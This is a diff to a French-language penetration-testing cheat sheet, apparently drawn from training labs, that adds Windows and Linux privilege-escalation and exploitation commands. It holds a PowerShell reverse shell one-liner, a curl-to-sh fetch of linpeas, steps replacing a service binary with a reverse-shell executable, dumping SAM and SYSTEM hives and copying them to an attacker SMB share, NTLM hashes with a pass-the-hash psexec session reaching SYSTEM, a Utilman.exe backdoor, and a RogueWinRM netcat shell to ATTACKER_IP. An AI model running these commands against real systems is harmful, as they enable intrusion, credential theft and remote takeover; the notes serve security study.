@@ -264,7 +264,11 @@
         stty rows <number>
         stty cols <number>
 
-      Connection RDP
+      Connection RDP via linux
+        xfreerdp /u:"User name" /v:IP:3389
+      
+        apt install rdesktop
+        rdesktop 192.18.1.21 -f
 
       POWERSHELL
         powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =         (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -275,19 +279,145 @@
 
 #[PRIVESC]   
 
-    sudo -l pour voir qqchose executable en root
+    POur linux :
+        sudo -l pour voir qqchose executable en root
+        
+        Linpeas pour enum les gtfobins
+          SE METTRE DANS LE TMP
+          curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+          wget 
     
-    Linpeas pour enum les gtfobins
-      SE METTRE DANS LE TMP
-      curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
-      wget 
+        gtfobins
+          https://gtfobins.github.io/
+    
+        DirtyCOW
+          https://dirtycow.ninja/
 
-    gtfobins
-      https://gtfobins.github.io/
+     Pour windows :
+         WinPEAS
+           https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
-    DirtyCOW
-      https://dirtycow.ninja/
+         PrivEscCheck : 
+           https://github.com/itm4n/PrivescCheck
+         
+        WES-NG: Windows Exploit Suggester
+            https://github.com/bitsadmin/wesng
 
+      MSF exploit suggester:
+          multi/recon/local_exploit_suggester
+        
+
+#[EXPLOITATION WINDOWS]
+
+    Endroit à regarder :
+        C:\Unattend.xml
+        C:\Windows\Panther\Unattend.xml
+        C:\Windows\Panther\Unattend\Unattend.xml
+        C:\Windows\system32\sysprep.inf
+        C:\Windows\system32\sysprep\sysprep.xml
+
+    Voir le sprivilges de mon user :
+        whoami /priv
+
+    Voir historique commande powershell (via cmd)
+        type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+    Save creds 
+        cmdkey /list
+        runas :
+          runas /savecred /user:admin cmd.exe
+
+    IIS confgiguration
+          trouver configuration database IIS (via cmd)
+            type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+    Retrouver creds putty (via cmd)
+          reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+    Voir la structure d'un service (via cmd)
+           sc qc "nom du service"
+
+    Voir les permissions d'un executable ou d'nu service (via cmd)
+          icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+
+    Injecter un payload dans un service windows
+          C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+          C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+                  1 file(s) moved.
+          
+          C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+                  1 file(s) moved.
+          
+          C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F   (donne les full permissions à tout le monde)
+                  Successfully processed 1 files.
+          C:\> sc stop windowsscheduler
+          C:\> sc start windowsscheduler
+
+      Checker les DACL (permissions, qui peut acceder à une ressource donnée)
+          C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+
+      Changer le path executable d'un service
+          sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+
+      Exporter la base SAM et la base SYSTEM
+          C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+          The operation completed successfully.
+          
+          C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+          The operation completed successfully.
+
+      Créer un partage samba sur linux
+          user@attackerpc$ mkdir share
+          user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+          C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+          C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+
+      Impacket pour dumper les hash de la base SAM
+          user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+          Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+          
+          [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+          [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+          Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+          
+      Impacket pour attaquer via PASS THE HASH
+          user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.120.172
+          Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+          
+          [*] Requesting shares on 10.10.175.90.....
+          [*] Found writable share ADMIN$
+          [*] Uploading file nfhtabqO.exe
+          [*] Opening SVCManager on 10.10.175.90.....
+          [*] Creating service RoLE on 10.10.175.90.....
+          [*] Starting service RoLE.....
+          [!] Press help for extra shell commands
+          Microsoft Windows [Version 10.0.17763.1821]
+          (c) 2018 Microsoft Corporation. All rights reserved.
+          
+          C:\Windows\system32> whoami
+          nt authority\system
+
+      Abuse Utilman.exe
+           takeown /f C:\Windows\System32\Utilman.exe
+           icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+           C:\Windows\System32\> copy cmd.exe utilman.exe
+           Lock scree
+           Cela donne un cmd avec le user nt authority\system
+
+           Utiliser RogueWinRM pour obtenir un shell
+           nc -lvp 4442
+           c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+
+    Abuser d'un software vulnerable
+            lister les software isntallés via wmic
+              wmic product get name,version,vendor
+            Rechercher exploit sur exploit-db ou google
+
+    
+            
+           
 #[WORDLISTS]
 
     apt -y install seclists (https://github.com/danielmiessler/SecLists)
